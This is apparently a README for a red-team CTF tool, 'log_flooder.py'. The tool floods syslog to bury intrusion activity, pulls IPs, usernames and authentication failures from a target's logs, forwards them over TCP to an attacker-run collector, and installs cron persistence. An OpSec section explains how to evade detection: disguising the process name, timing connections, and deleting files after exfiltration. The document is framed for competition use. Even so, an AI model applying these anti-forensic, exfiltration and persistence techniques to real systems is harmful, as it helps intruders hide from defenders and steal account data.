# CTF Log Manipulation & Intelligence Tool

**Author:** Seonho Park — scp4941@rit.edu  
**Category:** 3 (Destructive/Distracting) 
**Language:** Python 3.6+ — standard library only, no pip install required  
**Target OS:** Linux (tested on Ubuntu 22.04 / Kali 2024.1)

---

## Overview

'log_flooder.py' is a modular log-based tool designed for Red Team usage in CTFs. 
Its aim is to tackle four common problems that arise for Red Team with a single script:

| Problem | Feature |
|---|---|
| Blue Team reads logs to detect and investigate intrusions | **Log noise generation** — floods syslog with synthetic events, making tracking more difficult |
| You want to understand what a target box is logging | **Log extraction & analysis** — reads accessible logs, extracts IPs, usernames, and error patterns to give Red Team a lead on intelligence |
| You get kicked off of a Blue Team service or workstation | **TCP forwarding** — streams JSON findings to a central collector on your chosen Red Team box |
| You need persistence | **Cron Job** — installs and removes a cron job entry in between reboots, so that even if you get booted, your tool can still be accessible at a later point |

Because of its application in CTFs specifically, this tool is intentionally non-destructive 
and non-invasive. It only reads logs that you have access to, writes only to tbe local disk
or a TCP socket you control, and cannot be used to modify or delete target system files.  

---

## Requirements & Dependencies

| Requirement | Detail |
|---|---|
| Python | 3.6 or newer |
| OS | Linux (syslog flooding requires `/dev/log`) |
| Dependencies | **None** — stdlib only (`socket`, `json`, `logging`, `threading`, …) |
| Flood privilege | `root` required for `--flood` |
| All other features | Unprivileged user |

---

## Installation

Copy the single script to the target or your
RT box and run it:

```bash
# Clone or extract tool repo
cd Log-Flooder
# Transfer to target (from your workstation):
scp log_flooder.py user@target:/tmp/log_flooder.py

# Verify it runs:
python3 log_flooder.py --help
```

---

## Usage

### Global flags at a glance

```
--logs PATH [PATH …]       Log files to read (default: /var/log/syslog, auth.log, messages)
--keywords KW [KW …]       Keywords to flag (default: failed sudo root error)
--storage-dir DIR          Where to save JSON findings (default: ./rt_collected_logs)

--collect                  Analyse logs, print findings
--raw                      Print raw log lines (first 100)
--save                     Save findings to JSON in --storage-dir
--summary                  Print summary of all previously saved findings

--forward HOST             Forward findings (or raw lines) to HOST
--port PORT                Collector port (default: 5140)
--send-raw                 Forward raw lines instead of analysed findings

--serve                    Run collection server (blocks — run on RT box)
--bind ADDR                Bind address for server (default: 0.0.0.0)

--flood                    Generate syslog noise (root only)
--rate N                   Messages/sec, max 50 (default: 5)
--duration N               Seconds, max 300 (default: 30)

--persist SCRIPT           Add cron entry to re-run SCRIPT every 5 min
--unpersist SCRIPT         Remove that cron entry (cleanup)
```

---

### Basic usage examples

#### 1. Collect and print findings from default logs

```bash
python3 log_flooder.py --collect
```

```
[+] Running as unprivileged user
[+] Analysing logs (keywords: ['failed', 'sudo', 'root', 'error']) …
[+] 142 findings extracted
  [/var/log/auth.log] [keyword:failed, auth_failure_or_error] Failed password for invalid user admin from 192.168.1.105 port 54321
  [/var/log/auth.log] [keyword:sudo] sudo: alice : TTY=pts/1 ; USER=root ; COMMAND=/bin/bash
  …
```

#### 2. Collect, save locally, and forward to Red Team box

```bash
# On the target box:
python3 log_flooder.py --collect \
    --keywords failed sudo root ssh \
    --logs /var/log/auth.log /var/log/syslog \
    --save \
    --forward 10.0.0.32
```

```
[+] Running as unprivileged user
[+] Analysing logs (keywords: ['failed', 'sudo', 'root', 'ssh']) …
[+] 87 findings extracted
[+] Findings saved → rt_collected_logs/findings_20250215T143022Z.json
[+] Forwarded 87 entries to 10.0.0.50:5140  (failed: 0)
```

#### 3. Run the collection server on your RT box

```bash
# On your RT box (blocks until Ctrl-C):
python3 log_flooder.py --serve --bind 0.0.0.0 --port 5140 \
    --storage-dir /home/rtuser/collected
```

```
[+] Collection server listening on 0.0.0.0:5140
[+] Storing to /home/rtuser/collected
[+] Connection from 192.168.10.22:49812
[+] 192.168.10.22: received 87 entries
[+] Saved 87 entries → /home/rtuser/collected/findings_20250215T143023Z.json
```

#### 4. Generate log noise to bury your activity

```bash
# Requires root — floods syslog with 20 synthetic events/sec for 2 minutes:
sudo python3 log_flooder.py --flood --rate 20 --duration 120
```

```
[+] Running as root
[+] Flooding syslog at 20 msg/sec for 120s …
[+] Flood complete — 2400 entries written
```

#### 5. Print an aggregated summary of all collected findings

```bash
python3 log_flooder.py --summary --storage-dir /home/rtuser/collected
```

```
=== Findings Summary ===
  Total entries : 312
  Flag counts   : {'auth_failure_or_error': 198}

  Top IPs:
    192.168.1.105           87 hits
    10.10.0.2               34 hits
    …

  Top Users:
    admin                   42 hits
    root                    31 hits
    …
```

#### 6. Remove cron persistence

```bash
python3 log_flooder.py --unpersist /tmp/log_flooder.py
```

---

## OpSec & Operational Notes

### What artifacts this tool creates

| Artifact | Location | Risk |
|---|---|---|
| JSON findings files | `./rt_collected_logs/` (or `--storage-dir`) | HIGH — delete after exfil |
| Cron entry | `crontab -l` | MED — visible to any user; remove with `--unpersist` |
| TCP connection | Target → RT box | MED — shows up in `netstat`/`ss`; time carefully |
| Syslog flood entries | `/var/log/syslog` | MED — synthetic nature can raise flags |
| Python process | `ps aux` | LOW — name it something innocuous |

### Reducing detection risk

- **Use `--forward` immediately** rather than leaving JSON files on disk.
- **Run `--flood` sparingly** — very high syslog rates are themselves
  anomalous and may trigger SIEM alerts.
- **Time TCP connections** to coincide with normal traffic windows.
- **Rename the script** — `python3 /tmp/update_daemon.py` is less suspicious
  in `ps` output than `log_flooder.py`.

### Cleanup checklist

```bash
# Remove cron entry
python3 log_flooder.py --unpersist /tmp/log_flooder.py

# Remove findings files
rm -rf rt_collected_logs/

# Remove script
rm /tmp/log_flooder.py

# Verify cron is clean
crontab -l
```

---

## Limitations

- **Syslog flooding** requires a running syslog daemon and `/dev/log`.
- **Log collection** is limited to files readable by the current user; most
  interesting logs (`/var/log/auth.log`, `/var/log/syslog`) require root on
  Debian/Ubuntu by default.
- **TCP forwarding** is plaintext — do not forward sensitive findings over
  untrusted networks.
- **No reconnect logic** in the forwarder — if the connection drops mid-send,
  remaining entries are counted as failed. Re-run to retry.
- **No Windows support** — relies on POSIX paths, `/dev/log`, and crontab.

---

## Future Improvements

- TLS encryption on the forwarding channel
- Automatic retry with exponential back-off for failed sends
- Pattern-based false-positive filtering (suppress known-noisy log sources)
- Structured query/filter on saved JSON findings
- Compressed transfer (gzip) for large log sets
- Expand usability for non-privileged users

---

## Credits & References

- https://docs.python.org/3/library/logging.handlers.html
- https://docs.rsyslog.com/doc/index.html
- https://www.man7.org/linux/man-pages/man3/syslog.3.html
- https://docs.python.org/3/library/subprocess.html
- https://github.com/kr3tu/RED-TEAM-Tools#certsniff
- https://github.com/gentilkiwi/mimikatz
- 

